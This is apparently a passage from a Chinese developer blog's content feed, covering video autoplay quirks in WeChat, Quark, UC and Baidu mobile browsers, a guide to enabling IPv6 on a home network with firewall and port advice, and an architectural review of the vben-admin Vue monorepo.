class="params"></span>) &#123;</span><br><span class="line"><span class="title class_">WeixinJSBridge</span>.<span class="title function_">invoke</span>(<span class="string">&#x27;getNetworkType&#x27;</span>, &#123;&#125;, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line"><span class="comment">// 必须在 WeixinJSBridge 的回调函数中调用 `video.play()` 才生效，这是微信的限制</span></span><br><span class="line">video.<span class="title function_">play</span>();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 WeixinJSBridge 加载成功后直接播放</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">WeixinJSBridge</span>) &#123;</span><br><span class="line"><span class="title function_">doPlay</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 否则，等 WeixinJSBridge 加载成功</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;WeixinJSBridgeReady&#x27;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;on WeixinJSBridgeReady&quot;</span>)</span><br><span class="line"><span class="title function_">doPlay</span>()</span><br><span class="line"><span class="comment">// 你也可以直接在这里调用 video.play()</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者控制页面中已有的 video 元素：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> video = docuemnt.<span class="title function_">querySelector</span>(<span class="string">&quot;#video&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doPlay</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="title class_">WeixinJSBridge</span>.<span class="title function_">invoke</span>(<span class="string">&#x27;getNetworkType&#x27;</span>, &#123;&#125;, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">video.<span class="title function_">play</span>();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">WeixinJSBridge</span>) &#123;</span><br><span class="line"><span class="title function_">doPlay</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;WeixinJSBridgeReady&#x27;</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;on WeixinJSBridgeReady&quot;</span>)</span><br><span class="line"><span class="title function_">doPlay</span>()</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Android 的微信浏览器中同样无法自动播放，并且 <code>WeixinJSBridgeReady</code> 并不会被触发，因此我们没办法进行自动播放（参考了多个网站，都没有在微信做自动播放），只能引导用户手动播放。</p><h1 id="3-夸克的自动播放策略"><a href="#3-夸克的自动播放策略" class="headerlink" title="3. 夸克的自动播放策略"></a>3. 夸克的自动播放策略</h1><p>在 IOS 下：</p><ul><li>视频播放器会被拦截</li><li>静音和非静音视频均不允许自动播放；</li><li>muted 的设置是无效的，即使后续用户播放了视频，也是带有声音的；</li><li>JS 可以直接调用 <code>video.play()</code> 来播放视频，无需用户交互；</li><li>loop 无效；</li><li>多音频和视频播放：<ul><li>有声视频和音频之间会互相暂停；</li><li>被迫暂停后不会触发 pause 事件；</li></ul></li></ul><p>在 Android 下：</p><ul><li>视频播放器会被拦截，yyeva 失效；</li><li>符合标准策略；</li><li>多音频和视频播放：<ul><li>有声视频和音频之间会互相暂停；</li><li>被迫暂停后会触发 pause 事件；</li></ul></li></ul><h1 id="4-UC"><a href="#4-UC" class="headerlink" title="4. UC"></a>4. UC</h1><p>在 iOS 下：</p><ul><li>视频播放器会被拦截；</li><li>静音和非静音视频均不允许自动播放；</li><li>muted 的设置是无效的，即使后续用户播放了视频，也是带有声音的；</li><li>JS 直接调用 <code>video.play()</code> 没有触发报错；</li><li>多音频和视频播放：<ul><li>当一个视频在播放中时，播放另一个视频时会触发 JS 报错；</li><li>当视频在播放中时播放音频，视频会被暂停，反之亦然；</li><li>视频被迫暂停后会触发 pause 事件；</li></ul></li></ul><p>在 Android 下：</p><ul><li>可以使用 <code>renderer=&quot;standard&quot;</code> 防止播放器被浏览器拦截；</li><li>符合标准策略；</li><li>多音频和视频播放：<ul><li>同一个页面如果存在多个音频或视频，其中一个播放后，其他的视频会被暂停，并且不会触发 pause 事件，无论是否有声(yyeva 在播放中会出现突然暂停但是语音仍播放的情况)；</li></ul></li></ul><h1 id="4-百度-APP"><a href="#4-百度-APP" class="headerlink" title="4. 百度 APP"></a>4. 百度 APP</h1><p>在 iOS 下：</p><ul><li>即使视频不静音也能自动播放；</li><li>可以直接在 JS 中调用 <code>video.play()</code>；</li><li>多音频和视频播放：<ul><li>有声视频点击播放，或者出发循环播放时，会暂停所有音频的播放；</li><li>音频的播放不会打断有声视频的播放；</li><li>无声视频和音频之间不会互相干扰播放状态；</li><li>多个有声视频同时播放时，当前播放的有声视频会暂停其他视频的播放；</li><li>视频被迫暂停时会触发 pause 事件；</li></ul></li></ul><p>在 Android 下：</p><ul><li>即使视频不静音也能自动播放；</li><li>可以直接在 JS 中调用 <code>video.play()</code>；</li><li>多音频和视频播放：<ul><li>当多个有声视频同时播放时，最新播放的有声视频会暂停上一个有声视频；</li><li>当视频为 muted 时，视频之间的播放不受影响，即使用户手动将 control 上的静音按钮取消，也仍然能同时播放多个有声视频；</li><li>音频会暂停有声视频的播放，无声视频不受影响；</li></ul></li></ul><p>yyeva 卡住的根因：多个视频同时加载</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML5 </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>家庭网络开启 IPv6 指南</title>
      <link href="/2025/03/e7b781889bd1.html"/>
      <url>/2025/03/e7b781889bd1.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-为什么要开启-IPv6"><a href="#1-为什么要开启-IPv6" class="headerlink" title="1. 为什么要开启 IPv6"></a>1. 为什么要开启 IPv6</h1><p>互联网点对点通信的基础是知晓双方的 IP，然后就可以互相发送数据，然而在传统的 IPv4 网络中，由于 IPv4 资源逐渐稀缺，因此运营商需要借用 NAT 技术将民用网络按照地理位置区块，划分成一个个子网，让子网间共用一个 IPv4 地址。由于 NAT 的层层嵌套，点对点通信变得很困难，运营商也不会为个人分配 IPv4 公网地址。因此如果你想在公网环境下，通过点对点的方式直接访问到家庭网络的设备几乎是不可能的，必须借助内网穿透等方案进行实现。</p><p>然而在 IPv6 时代下，有了足够多的 IPv6 地址，可以为每个人、甚至每个设备都分配一个公网 IPv6 地址，这使得我们可以轻松的访问到我们的家庭网络，随时随地的查看家庭 NAS 上的视频、串流游戏 。此外，对于个人来说也无需购买云服务器了，可以自己在家部署一台 7X24 的服务器来给自己工作、学习使用，并且家庭宽带的上下行速度要比云服务器的快得多，并且还是不限量的。</p><h1 id="2-如何开启-IPv6"><a href="#2-如何开启-IPv6" class="headerlink" title="2. 如何开启 IPv6"></a>2. 如何开启 IPv6</h1><p>如果你的家庭宽带是近几年办理的，那么运营商一般都会给你的光猫打开 IPv6 功能，你一般不需要动就可以在内网拥有一个 IPv6 环境，你可以使用 <a href="https://test-ipv6.com/">Test-IPv6</a> 来进行测试：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202503261650884.png" alt="image.png|400"></p><p>但是由于运营商的光猫可能设置有 IPv6 防火墙，并且不可更改，我还是建议你去调整一下光猫的设置，将光猫改为桥接模式，使用路由器进行拨号。</p><p>所谓的光猫改桥接就是关闭光猫的 PPPoE（宽带拨号认证服务）、DHCP（内网 IP 分配服务），让你的路由器执行拨号上网、IP分配、NAT 转换等工作，只让光猫进行一个光电信号转换的工作（追求极致的话还可以将光猫替换为猫棒）。这样既能更好的管理 IPv6 功能，也能让你花了大价钱的路由器负担光猫的工作，发挥出宽带的最大性能。</p><blockquote><p>热知识：宽带运营商给你家的宽带一般设计的都用 20% 的冗余，500M 的宽带测速应该在 600M，1000M 的宽带测速应该在 1200M，如果你距离这个速度很远，那么就说明你的家庭网络还有很大的优化空间。</p></blockquote><p>关于如何光猫改桥接，需要自己上网上进行查找，难点在于获取路由器的管理密码以及自己的宽带账户，前者如果按网上找的管理密码都不对的话，可以上万能的某宝付费获取，后者可以咨询运营商。如果比较社牛的话，还可以要求运营商派工程师上门帮你改。这里放一个改桥接的参考视频，不同运营商改桥接的方式都大同小异：</p><ul><li><a href="https://b23.tv/bbVf1Ye">光猫拨号上网改成桥接教程-哔哩哔哩</a></li></ul><p>改完桥接后，登录路由器的管理界面，找到 IPv6 选项并开启，方式选择 Native，并关闭防火墙（或者找到类似“允许入站”的选项），关于关闭防火墙的安全行问题我们在下一章节讨论。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202503261705556.png" alt="image.png|400"></p><p>然后我们查看一下设备的网络选项，如果成功分配到了 IPv6 地址，那就说明我们已经处于一个 IPv6 的网络环境了，此时你可以关闭设备的防火墙，开启一个网络服务端口（<strong>注意不能是 80 和 443，这两个端口被运营商禁用</strong>），你就可以在外网使用设备的 IPv6 地址成功访问到设备上部署的服务了。</p><blockquote><p>如果无法访问且地址能 ping 通的话可能是防火墙设置问题。如果无法访问并且 ping 不通的话可能是路由器分配给你设备的 IPv6 地址不在公网范围内，需要咨询运营商，或者在路由器上使用端口转发功能将内网端口转发到路由器 WAN 口的公网 IP 上。</p></blockquote><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202503261713293.png" alt="image.png|400"></p><p>关于 IPv6，有以下几个知识点需要知悉：</p><ul><li>IPv6 的网段：IPv6 地址如果是 2000、2001、2400 开头的，一般为公网地址，可以直接访问。如果是 fe80 网段，就相当于 IPv4 的 192.168.x.x 是一个本地局域网内的地址。</li><li>多个 IPv6 地址：设备一般会生成 3 个 IPv6 地址，一个以 fe80 开头的局域网地址、一个长期的 IPv6 公网地址、一个临时的 IPv6 地址。临时的 IPv6 地址是处于安全性考虑的，可以将这个地址开放给外部进行临时性的调用。</li></ul><h1 id="3-IPv6-下的安全管理"><a href="#3-IPv6-下的安全管理" class="headerlink" title="3. IPv6 下的安全管理"></a>3. IPv6 下的安全管理</h1><p>前面我们关闭了路由器的防火墙，如果不关闭路由器防火墙的话我们无法从外网获访问到内网设备。但关闭了也就意味着你的家庭设备就完全对外开放了（当然有的设备，比如 Windows 会自带防火墙），这是比较危险的。好在是 IPv6 地址足够复杂，是无法依靠穷举找到你家的 IPv6 公网地址并精准锁定到某个设备的。</p><p>如果你的路由器支持精准的防火墙设置，如使用了 OpenWrt，那是最好的，你可以精准的控制对外公开的 IPv6 地址和端口号。但是大多数人用的并非 OpenWrt，那么我建议你最好做好网络管理，以我希望暴露在公网上的 Ubuntu 主机为例，无必要注意以下几点：</p><ul><li>保护好你的 IPv6 地址：绝对不能轻易的将你的设备 IPv6 地址暴露出去，或者在非可信任的网络中访问你的 IPv6 地址，因为这样别人就能沿着你的公网地址对你的设备进行攻击，除非你很肯定设备暴露在公网上是完全安全的；</li><li>开启设备防火墙：以 Ubuntu 为例，必须要开启 ufw，这是一个防火墙的前端管理工具，能够帮我们更好的控制 iptables。<ul><li>ufw 默认会禁用所有端口，如果你希望公开端口，则需要使用 <code>ufw allow [端口]</code> 来进行开启；</li><li>我们在内网环境下通常是安全的，因此可以对内网 IP 开放所有端口，使用 <code>sudo ufw allow proto any from 192.168.0.0/16</code> 允许 192.168.x.x 网段的所有设备访问任意端口；</li><li>可以使用 1Panel 来可视化的管理防火墙配置；</li></ul></li><li>端口管理：不要将常见的端口对外暴露，比如 mysql 的 3306 端口，因为端口扫描的成本是很低的，应该使用高位端口从而一定程度的避免扫描；</li><li>高敏服务加强密码管理：比如 ssh 的远程访问，可以使用高强度密码 + Google 验证器的方式来防止被侵入；<h1 id="4-IPv6-应用"><a href="#4-IPv6-应用" class="headerlink" title="4. IPv6 应用"></a>4. IPv6 应用</h1></li></ul><h3 id="DDNS-动态域名绑定"><a href="#DDNS-动态域名绑定" class="headerlink" title="DDNS 动态域名绑定"></a>DDNS 动态域名绑定</h3><p>运营商分配的公网地址一般是动态的，如果我们直接记着一个 IPv6 进行连接那么过一段时间这个地址可能就失效的。但是我们自己的域名是不会变的，因此只要在设备的公网 IPv6 地址发生变化时去修改域名绑定的 IP，我们只访问不变的域名即可。这个方案就叫做 DDNS 域名动态绑定。</p><p>DDNS-GO 是一个带有 WebUI 的域名动态绑定工具，填写你的 DNS 服务商 AK SK 信息后，DDNS GO 就会在后台不断监听网卡的 IPv6 地址变动，一旦发生变动就会调用 DNS 服务商的 API 来变更域名的绑定信息。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202503271514153.png" alt="image.png|400"></p><h3 id="网站托管"><a href="#网站托管" class="headerlink" title="网站托管"></a>网站托管</h3><p>与 IPv4 服务器的网站托管没有什么区别，但是需要注意的是 <strong>运营商会禁用掉 80 和 443 端口</strong>，从客户端访问后会从运营商层面进行拦截，因此本机的 Nginx、防护墙不会收到任何入站的日志。</p><h3 id="PS5-串流"><a href="#PS5-串流" class="headerlink" title="PS5 串流"></a>PS5 串流</h3><ol><li>安装 PS Remote Play 或 PxPlay，并保证 PS5 的网络详情中，网络类型在 NAT2 或 NAT1。</li><li>先在本地连接配对过一次，并完成认证；</li><li>在路由器设置中，将 PS5 设置为静态 IP，并开启路由器的 DMZ 功能（一般在端口转发模块中），输入 PS5 的内网 IPv4 地址。这一步相当于将 PS5 的所有端口都映射到了路由器的 IPv6 公网地址上，这样我们才能在公网连接到 PS5；</li><li>在公网远程连接 PS5；</li></ol>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>veben-admin 项目设计鉴赏</title>
      <link href="/2025/01/9c6b435d0485.html"/>
      <url>/2025/01/9c6b435d0485.html</url>
      
        <content type="html"><![CDATA[<h1 id="第三方包"><a href="#第三方包" class="headerlink" title="第三方包"></a>第三方包</h1><ul><li>radix-vue：Radix UI 的 Vue 实现</li><li>shadcn-ui：其并非是一个组件库（不通过 npm 发布），而是一组可重用的组件实践，用户需要将组件源码直接复制到项目中使用；</li><li>defu：轻量级的对象属性合并函数（mesrge）</li></ul><h1 id="使用-catalog-统一-monorepo-项目的包依赖版本号"><a href="#使用-catalog-统一-monorepo-项目的包依赖版本号" class="headerlink" title="使用 catalog 统一 monorepo 项目的包依赖版本号"></a>使用 catalog 统一 monorepo 项目的包依赖版本号</h1><p><a href="https://pnpm.io/catalogs">官方文档</a></p><p>在 monorepo 项目中，各个子模块中依赖的“基础” npm pacakge 他们的版本号应该是一致的，比如：</p><ul><li>在 Vue 项目中，各个模块的 Vue 版本应该保持一致；</li><li>eslint、prettier、typescript 这种开发依赖都应该保持一致，方便维护；</li></ul><p>但你也可以用一些方案来规避这一问题：</p><ul><li>将这些“公共包”都使用 <code>pnpm install xxx -w</code> 安装在工作区目录，从而保证全局的模块都是从根目录寻包，但是对于 monorepo 的设计思想来说，每个子包的依赖都应该是独立的，所以这一做法实际上并不稳妥，它会逐渐导致你子包的依赖变得不清晰，也会让子包的依赖散落的导出都是；</li><li>使用 <code>pnpm dedupe</code> 来将已安装的包统一到当前可用的最高版本；</li></ul><p>pnpm catalog 就是用来处理这一问题的，我们可以在 <code>pnpm-workspace.yaml</code> 中声明 catalog 配置来定义项目中公共包的版本号，比如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">catalog:</span></span><br><span class="line"><span class="attr">vue:</span> <span class="string">^3.5.13</span></span><br><span class="line"><span class="string">&#x27;@vue/reactivity&#x27;</span><span class="string">:</span> <span class="string">^3.5.13</span></span><br><span class="line"><span class="string">&#x27;@vue/shared&#x27;</span><span class="string">:</span> <span class="string">^3.5.13</span></span><br><span class="line"><span class="string">&#x27;@vue/test-utils&#x27;</span><span class="string">:</span> <span class="string">^2.4.6</span></span><br><span class="line"><span class="string">&#x27;@vueuse/core&#x27;</span><span class="string">:</span> <span class="string">^12.2.0</span></span><br></pre></td></tr></table></figure><p>此时，如果你在子包使用 <code>pnpm add vue</code>，那么在子包的 <code>package.json</code> 中，这些在 catlog 中定义过的包就会变为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;catalog:&quot;</span><span class="punctuation">,</span></span><br><span class="line">... ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="使用-unbuild-构建子包"><a href="#使用-unbuild-构建子包" class="headerlink" title="使用 unbuild 构建子包"></a>使用 unbuild 构建子包</h1><p>unbuild 是一个基于 rollup 的、开箱即用的构建工具，其内部集成了多中 rollup 插件并自动启用，因此用于快速构建一个基于 Typescript 的 JavaScript lib 是一个非常好的选择。vben 将其用于 lib 的构建工具之外，最主要的是利用了其可以编译 JIT（运行时编译）包来简化重新构建依赖的负担。</p><p>unbuild 引入了 jiti 用于将 ts 源码文件进行实时编译，当我们执行 <code>unbuild --stub</code> 后，unbuild 并不会直接生成一个 js bundle，而是生成一个入口文件，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createJiti &#125; <span class="keyword">from</span> <span class="string">&quot;../../../../node_modules/.pnpm/jiti@2.4.2/node_modules/jiti/lib/jiti.mjs&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jiti = <span class="title function_">createJiti</span>(<span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>, &#123;</span><br><span class="line">  <span class="string">&quot;interopDefault&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;alias&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@vben/eslint-config&quot;</span>: <span class="string">&quot;/Users/jiguangrui/Documents/code/demo/vue-vben-admin/internal/lint-configs/eslint-config&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;transformOptions&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;babel&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;plugins&quot;</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">import(&quot;/Users/jiguangrui/Documents/code/demo/vue-vben-admin/internal/lint-configs/eslint-config/src/index.js&quot;)</span>&#125; */</span></span><br><span class="line"><span class="keyword">const</span> _module = <span class="keyword">await</span> jiti.<span class="title function_">import</span>(<span class="string">&quot;/Users/jiguangrui/Documents/code/demo/vue-vben-admin/internal/lint-configs/eslint-config/src/index.ts&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> defineConfig = _module.<span class="property">defineConfig</span>;</span><br></pre></td></tr></table></figure><p>入口文件利用 <code>jiti.import</code> 将源码文件进行了引用，这样当其他的代码引用了 unbuild 构建的代码后其实是调用 jiti 的运行时函数，实时的将源码编译为 js。</p><p>vben 将 <code>internal</code> 目录下使用 TS 编写的包都使用 unbuild 生成了 JIT 包，这样既保证了 node 能够正常运行这些经过 jiti 包装过的 TS 代码（比如提供给项目中的 lint 工具、tailwind、vite 使用），又不需要实时的对代码进行重新编译，减轻了开发负担。</p><h1 id="BEM-类名规范实践"><a href="#BEM-类名规范实践" class="headerlink" title="BEM 类名规范实践"></a>BEM 类名规范实践</h1><p>在 vben 中，编写 CSS 用了三种方案：CSS Module、Tailwind CSS、BEM，其中 BEM 可以看做是解决那些不得不写在全局的样式命名冲突的问题。</p><p>对于书写 template 中的 DOM Class，vben 在 <code>@vben-core/composables</code> 提供了一个 <code>useNamespace</code> 的 hook，可以解构出 <code>b</code> <code>e</code> <code>m</code> <code>be</code> <code>em</code> … 几个生成类名的方法。</p><p>对于书写 SCSS 时，在 <code>@vben-core/design</code> 中提供了 <code>b</code> <code>e</code> <code>m</code> 三个 minxin 来辅助书写 BEM 类名，该 mixin 被 <code>global.scss</code> 引用，最终会经过 vite 的 scss plugin 进行全局注入，因此可以全局使用。此外，由于 scss 的类名可嵌套、可继承的特性，其并不需要穷举出来所有的 b、e、m 函数组合，只需要按照结构嵌套使用即可。</p><p>最后补充，BEM 在 vben 中并非强制使用的类名规范，其只也在 <code>menu-ui</code> 模块中被使用。BEM 本身也只适合在构建规范化的基础组件库时使用，在业务中如果一昧追求 BEM 的类名规范化是在为项目徒增成本。</p><h1 id="Turborepo"><a href="#Turborepo" class="headerlink" title="Turborepo"></a>Turborepo</h1><p><a href="https://turbo.build/repo/docs">官方文档</a></p><p>vbe 使用 turborepo 来管理子包的构建、开发、单元测试等指令。</p><p>在使用 turborepo 前，启动 monorepo 项目子包的开发指令通常需要进入到对应的 workspace 目录，或者使用 <code>--filter</code>、亦或在 <code>package.json</code> 中配置 script，这就导致运行子包的指令变得繁杂且难以维护。更在灾难的是如果需要对所有 workspace 执行构建、lint 指令的时候，启动将变得麻烦，并且运行速度也很慢。</p><p>turborepo 通过 <code>turbo.json</code> 配置，来配置 turbo 任务，从而让我们更好的启动项目指令，同时其也在内部对任务执行进行了优化、缓存，相对于单纯并发的调用 workspace 中的指令，turborepo 的执行速度会更快。</p><p>使用前：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20250111204101.png" alt=""></p><p>使用后：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20250111204121.png" alt=""></p><p>vben 除了使用 <code>turbo run</code> 指令外，自己还封装了一个 <code>turbo-run</code> 指令（<code>scripts/turbo-run</code>），这是因为 turborepo 只能并发启动任务。但是对于 <code>dev</code> 这种任务，通常只需要启动单独一个服务，但是 turborepo 并不支持独立启动一个 workspace 任务，因此 vben 使用 clack 自己实现了一个允许用户自行选择的启动脚本（脚本本身并没有调用 turboreoo）。</p><h1 id="状态管理"><a href="#状态管理" class="headerlink" title="状态管理"></a>状态管理</h1><p>vben 将 store 层通用的部分单独抽离到了 <code>@vben/stores</code> 这个子包中，多应用都从此处引用通用的 store。</p><p>通用的 store 有如下几个：</p><ul><li>core-user：<ul><li>存放用户信息、角色等内容；</li><li>对外提供的 action：<ul><li>setUserInfo：传入接口返回的用户信息，对 userInfo 进行 set，并解构出 rules 进行 set；</li><li>setUserRules：传入 rules 进行 set；</li></ul></li></ul></li><li>core-access：<ul><li>存放权限码、可访问的菜单列表、可访问路由列表、token、登录状态；</li><li>对外提供的 action 为：<ul><li>getMenuByPath：根据 path 获取对应的菜单配置；</li><li>setState 系列函数；</li></ul></li></ul></li><li>core-lock：提供给 layout 的锁屏组件使用的 state（感觉不是很有必要放在 state，作为组件 inject 就可以）<ul><li>存放锁屏相关的 state</li><li>对外提供的 action 为：<ul><li>lockScreen：传入密码，写入 state</li><li>unlockScreen：解锁屏幕，重置 state</li></ul></li></ul></li><li>core-tabbar：处理顶部 tab 相关逻辑</li></ul><p>此外还提供了几个工具函数，可以供应用直接引入：</p><ul><li>initStores：获取一个 pina 实例，为该 pina 实例装载一个持久化的插件（pinia-plugin-persistedstate）</li><li>resetAllStoers：获取 pina 中所有的 state，并调用他们的 <a href="https://pinia.vuejs.org/zh/api/interfaces/pinia._StoreWithState.html#reset">$reset</a> 方法</li></ul><h1 id="接口请求"><a href="#接口请求" class="headerlink" title="接口请求"></a>接口请求</h1><p>在 <code>packages/effects/request</code> 目录下，vben 基于 axios 构造了一个 <code>RequestClient</code> 类，相较于原始的 axios 其做了如下行为：</p><ul><li>构造函数传入的配置项为 <code>axios.create()</code> 传入的配置项，但是 <code>RequestClient</code> 为其添加了一些额外的默认参数，比如 headers、timeout；</li><li>构造出的实例继承 <code>axios.create()</code> 创建的 axios 实例的原型链；</li><li>通过 <code>addResponseInterceptor</code>、<code>addResponseInterceptor</code> 来管理拦截器；</li><li>重新封装了一层 get、post、delete、put、request 基础方法，但是并没有做额外的事情；</li><li>新增了 <code>upload</code> 方法，用于方便传递 <code>multipart/form-data</code> 数据；</li><li>新增了 <code>download</code> 方法，用于下载 blob；</li></ul><p>此外，request 目录下还封装了 <code>authenticateResponseInterceptor</code> 用来做 Token 刷新和重新认证。调用方需要将请求函数、重认证函数（指用户过期后采取的行为，比如跳转到登录页面并清空缓存）、token 刷新函数等传递给该方法，该方法返回一个拦截器提供给 <code>addResponseInterceptor</code> 调用。其内部实现为：</p><ul><li>检查请求拦截原因是否是 401；</li><li>如果是已经重新发起过的请求、或者禁用了自动刷新 token 功能，则执行重认证函数（跳转到登录页）；</li><li>如果正在刷新 token，则将发送中的请求放入队列等待刷新完成后重试；</li><li>调用刷新 token 函数；</li><li>请求成功后，重新发送等待队列中的请求；</li></ul><h1 id="用户鉴权"><a href="#用户鉴权" class="headerlink" title="用户鉴权"></a>用户鉴权</h1><p>每个 app 的用户鉴权都是独立的，在 <strong>app</strong> 的 store 目录下，<code>auth.ts</code> 模块负责了用户鉴权相关的内容。</p><p>在该模块下，对外暴露了 <code>authLogin</code> 函数，提供给点击用户登录按钮时调用，做了如下事务：</p><ol><li>调用登录接口，传入用户名账号密码；</li><li>将接口返回的 <code>accessToken</code> 存入 <code>accessStore</code>;</li><li>调用 <code>fetchUserInfo</code> 函数，获取用户信息；<ol><li><code>fetchUserInfo</code> 中调用获取用户信息的接口，并将用户信息存放在 <code>userStore</code> 中；</li></ol></li><li>调用 <code>getAccessCodesApi</code> 接口，获取用户权限信息；</li><li>登录成功，跳转到 home 页面；</li><li>弹出欢迎 notification；</li><li>返回 <code>&#123; userInfo &#125;</code></li></ol><p>此外该模块还提供了 <code>logout</code> 方法，在 token 过期、用户主动登出时进行调用，主要做了如下事务：</p><ol><li>调用登出接口通知后端；</li><li>重置所有的 store；</li><li>将 <code>accessStore</code> 中标记用户登录过期的字段标记为 <code>false</code>；</li><li>路由定向到登录页（同时为路由添加 redirect 字段）</li></ol><blockquote><p>token 过期、重认证的逻辑都在“接口请求”章节</p></blockquote><h1 id="页面路由"><a href="#页面路由" class="headerlink" title="页面路由"></a>页面路由</h1><ul><li>router<ul><li>index.ts：<ul><li>路由入口文件，调用 createRouter 生成路由对象</li><li>调用 <code>resetStaticRoutes</code> 删除没有 <code>name</code> 属性的路由</li><li>创建路由守卫</li></ul></li><li>access.ts：<ul><li>对外导出 <code>generateAccess</code> 方法，用于生成经过权限过滤的路由 Raw 和菜单</li><li>生成路由有两种方式：<ul><li>前端模式：通过 route.meta.authority 来过滤出有权限的路由</li><li>后端模式：后端接口生成 RouteRecordRaw 后前端进行匹配和应用</li></ul></li></ul></li><li>guard.ts：<ul><li>设置页面加载进度条效果</li><li>检查是否生成过动态路由，否则调用 access 模块来生成有权限的路由（addRoute 行为发生在 <code>generateAccessible</code> 中）</li><li>在上一步生成有权限的路由后还会生成菜单配置，将其都存到 store 层</li><li>检查 query 是否有 redirect 字段，有则进行重定向</li></ul></li><li>routes<ul><li>index.ts<ul><li>扫描 modules 目录获取所有的 Module</li><li>调用 <code>mergeRouteModules</code> 将所有的 Module 合并为一个 <code>RouteRecordRaw[]</code></li><li>将核心路由、动态路由、静态路由合并</li><li>模块对外导出合并后的路由对象<ul><li>accessRoutes：有权限校验的路由列表，包含动态路由和静态路由</li><li>coreRouteNames：核心路由名称列表，这些路由不需要进入权限拦截</li><li>routes：路由列表，由基本路由、外部路由和404兜底路由组成</li></ul></li></ul></li><li>core.ts：定义登录路由、404 路由等核心页面的路由</li><li>modules：动态路由</li></ul></li></ul></li></ul><h1 id="接口-mock"><a href="#接口-mock" class="headerlink" title="接口 mock"></a>接口 mock</h1><p>vben 内置了一个 mock 服务器，供前端人员 Mock 服务接口使用，位于 <code>apps/backend-mock</code>。</p><p>当环境变量 <code>VITE_NITRO_MOCK</code> 被设置为 <code>true</code> 且非构建模式时，vite 会加载 <code>viteNitroMockPlugin</code> 插件，该插件通过调用 <a href="https://nitro.build/">Nitro</a> 相关的 API 来启动一个 